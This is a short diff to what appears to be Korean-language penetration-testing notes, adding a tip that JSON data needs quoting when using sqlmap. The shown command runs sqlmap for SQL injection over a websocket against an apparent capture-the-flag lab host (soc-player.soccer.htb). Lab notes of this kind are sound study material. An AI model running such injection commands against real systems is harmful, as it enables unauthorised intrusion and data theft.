@@ -555,6 +555,7 @@ db.users.deleteOne({name: "test"})
   <summary><strong>SQLMAP</strong></summary>
 
 - `SQLMAP`으로 웹소켓 인젝션이 가능하다.
+- `JSON` 데이터를 전달할 때는 따옴표를 사용하여 전달해줘야 한다.
 ```bash
 sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id":"1234"}'
 ```
